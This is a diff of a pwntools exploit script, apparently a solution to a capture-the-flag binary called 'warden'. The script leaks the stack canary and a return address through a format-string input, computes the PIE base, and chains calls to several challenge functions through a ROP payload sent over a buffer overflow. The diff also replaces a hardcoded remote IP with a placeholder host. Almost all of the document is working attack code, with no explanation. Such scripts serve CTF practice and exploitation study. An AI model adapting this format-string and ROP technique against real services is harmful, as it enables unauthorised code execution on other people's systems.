@@ -1,15 +1,52 @@
+#!/usr/bin/env python3
 from pwn import *
 
+exe = ELF("./warden")
+context.binary = exe
+context.log_level = 'debug'
+context.terminal = ["cmd.exe", "/c", "start", "wsl.exe", "-e"]
 
-context.binary = binary = ELF('./warden', checksec=False)
-context.log_level = 'info'
+# context.arch = 'amd64' 
 
-#p = process('./warden')
-p = remote('14.225.212.104', 9004)
+# libc = ELF("./libc.so.6", checksec=False)
+# ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
 
-# --- LEAK ---
-p.recvuntil(b"breached.\n")
-p.sendline(b'%15$p|%19$p') 
+
+def sla(delim, data): return p.sendlineafter(delim, data)
+def sa(delim, data):  return p.sendafter(delim, data)
+def sl(data):         return p.sendline(data)
+def s(data):          return p.send(data)
+def ru(delim):        return p.recvuntil(delim)
+def rl():             return p.recvline()
+def r(n):             return p.recv(n)
+
+gdbscript = '''
+
+c
+'''
+
+def conn():
+    
+    if args.REMOTE:
+        return remote("HOST_ADDRESS", 1337)
+    
+    elif args.GDB:
+        return gdb.debug([exe.path], gdbscript=gdbscript)
+    
+    else:
+        
+        # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
+        
+        return process([exe.path])
+
+p = conn()
+
+
+# --- Exploit ---
+
+# Payload 
+ru(b"breached.\n")
+sl(b'%15$p|%19$p') 
 
 raw_output = p.recvline() 
 
@@ -23,26 +60,26 @@ log.success(f"Canary: {hex(canary)}")
 log.success(f"Leak Ret: {hex(leak_main_ret)}")
 
 offset_ret_main = 0x14fd 
-binary.address = leak_main_ret - offset_ret_main
-log.success(f"PIE Base: {hex(binary.address)}")
+exe.address = leak_main_ret - offset_ret_main
+log.success(f"PIE Base: {hex(exe.address)}")
 
-rop = ROP(binary)
+rop = ROP(exe)
 pop_ret = rop.find_gadget(['pop ebx', 'ret'])[0]
 
 payload = flat(
-    binary.symbols['braum'],
+    exe.symbols['braum'],
     pop_ret,
     4919,
 
-    binary.symbols['ornn'],
+    exe.symbols['ornn'],
     pop_ret,
     1056,
     
-    binary.symbols['thress'],
+    exe.symbols['thress'],
     pop_ret,
     0xdeadbeef,
     
-    binary.symbols['win'],
+    exe.symbols['win'],
     0x0,      
     291       
 )
@@ -50,6 +87,6 @@ payload = flat(
 final_payload = b'A' * 32 + p32(canary) + b'B' * 12 + payload
 
 log.info("Sending payload...")
-p.sendline(final_payload)
+sl(final_payload)
 
 p.interactive()
